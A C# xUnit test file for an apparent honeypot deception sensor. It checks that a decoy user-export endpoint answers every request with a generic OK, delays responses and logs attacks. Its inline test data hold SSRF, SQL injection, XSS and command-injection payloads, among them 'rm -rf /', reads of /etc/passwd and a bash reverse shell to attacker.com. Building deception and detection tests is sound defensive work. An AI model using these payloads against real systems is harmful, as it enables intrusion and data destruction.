namespace Deception.Sensor.Api.Tests.Endpoints;

using System.Net;
using Deception.Sensor.Api.Tests.Fixtures;

public class UsersExportEndpointTests : IClassFixture<TestApiContextFixture>
{
    private readonly HttpClient _httpClient;

    public UsersExportEndpointTests(TestApiContextFixture fixture)
    {
        _httpClient = fixture.Client;
    }

    [Fact]
    public async Task Should_Accept_Export_Request_And_Return_200_OK()
    {
        // Arrange
        var endpoint = "/api/users/export";

        // Act
        var response = await _httpClient.GetAsync(endpoint);

        // Assert
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
    }

    [Fact]
    public async Task Should_Return_Generic_Success_Response()
    {
        // Arrange
        var endpoint = "/api/users/export";

        // Act
        var response = await _httpClient.GetAsync(endpoint);
        var responseBody = await response.Content.ReadAsStringAsync();

        // Assert
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        Assert.Contains("\"status\":\"ok\"", responseBody);  // Generic masked response
    }

    [Fact]
    public async Task Should_Apply_Tarpitting_Delay_On_Response()
    {
        // Arrange
        var endpoint = "/api/users/export";
        var stopwatch = System.Diagnostics.Stopwatch.StartNew();

        // Act
        var response = await _httpClient.GetAsync(endpoint);
        stopwatch.Stop();

        // Assert
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        // Request should be delayed by 1-3 seconds (tarpitting)
        Assert.InRange(stopwatch.ElapsedMilliseconds, 1000, 3000);
    }

    [Fact]
    public async Task Should_Capture_Export_Request_Parameters()
    {
        // Arrange
        var endpoint = "/api/users/export?format=json&limit=1000";

        // Act
        var response = await _httpClient.GetAsync(endpoint);

        // Assert
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        // Query parameters should be captured by telemetry
    }

    [Theory]
    [InlineData("?url=http://internal-service:8080/admin")]
    [InlineData("?url=http://192.168.1.1/api")]
    [InlineData("?url=file:///etc/passwd")]
    [InlineData("?endpoint=http://localhost:5000")]
    public async Task Should_Accept_SSRF_Payload_Attempts(string ssrfPayload)
    {
        // Arrange
        var endpoint = $"/api/users/export{ssrfPayload}";

        // Act
        var response = await _httpClient.GetAsync(endpoint);

        // Assert
        // Should accept SSRF attempts without validation (engaging attackers)
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
    }

    [Theory]
    [InlineData("?select=*")]                              // SQL: SELECT *
    [InlineData("?filter=1 OR 1=1")]                       // SQL: OR condition
    [InlineData("?query='; DROP TABLE users; --")]         // SQL: Destructive
    [InlineData("?search=admin' UNION SELECT * FROM")]     // SQL: UNION injection
    [InlineData("?id=1 AND 1=1")]                          // SQL: Boolean-based
    public async Task Should_Accept_SQL_Injection_Payloads(string sqlPayload)
    {
        // Arrange
        var endpoint = $"/api/users/export{sqlPayload}";

        // Act
        var response = await _httpClient.GetAsync(endpoint);

        // Assert
        // Should accept SQL injection attempts without validation
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
    }

    [Theory]
    [InlineData("?cmd=ls")]
    [InlineData("?cmd=cat%20/etc/passwd")]
    [InlineData("?command=whoami")]
    [InlineData("?exec=rm%20-rf%20/")]
    [InlineData("?shell=bash%20-i%20>%26%20/dev/tcp/attacker.com/4444")]
    public async Task Should_Accept_Command_Injection_Payloads(string cmdPayload)
    {
        // Arrange
        var endpoint = $"/api/users/export{cmdPayload}";

        // Act
        var response = await _httpClient.GetAsync(endpoint);

        // Assert
        // Should accept command injection attempts without validation
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
    }

    [Theory]
    [InlineData("?format=<script>alert('xss')</script>")]
    [InlineData("?search=<img src=x onerror='alert(1)'>")]
    [InlineData("?data=javascript:alert('xss')")]
    public async Task Should_Accept_XSS_Payloads(string xssPayload)
    {
        // Arrange
        var endpoint = $"/api/users/export{xssPayload}";

        // Act
        var response = await _httpClient.GetAsync(endpoint);

        // Assert
        // Should accept XSS attempts without validation
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
    }

    [Fact]
    public async Task Should_Accept_Multiple_Injection_Types_In_Single_Request()
    {
        // Arrange - Combine multiple attack vectors
        var endpoint = "/api/users/export?url=http://internal&select=*&cmd=ls&xss=<script>";

        // Act
        var response = await _httpClient.GetAsync(endpoint);

        // Assert
        // Should accept complex polyglot injection attempts
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
    }

    [Fact]
    public async Task Should_Return_Same_Response_For_Legitimate_And_Malicious_Requests()
    {
        // Arrange - Legitimate request
        var legitimateEndpoint = "/api/users/export?format=json";

        // Act
        var legitimateResponse = await _httpClient.GetAsync(legitimateEndpoint);
        var legitimateBody = await legitimateResponse.Content.ReadAsStringAsync();

        // Arrange - Malicious request
        var maliciousEndpoint = "/api/users/export?url=http://internal&select=* FROM users;--";

        // Act
        var maliciousResponse = await _httpClient.GetAsync(maliciousEndpoint);
        var maliciousBody = await maliciousResponse.Content.ReadAsStringAsync();

        // Assert
        // Both should return identical generic response (deceiving)
        Assert.Equal(HttpStatusCode.OK, legitimateResponse.StatusCode);
        Assert.Equal(HttpStatusCode.OK, maliciousResponse.StatusCode);
        Assert.Equal(legitimateBody, maliciousBody);
    }

    [Fact]
    public async Task Should_Capture_Attack_Telemetry()
    {
        // Arrange
        var attackPayload = "/api/users/export?select=* FROM admin_users;--&url=http://internal";

        // Act
        var response = await _httpClient.GetAsync(attackPayload);

        // Assert
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        // Attack attempt should be logged to telemetry with full request details
    }
}
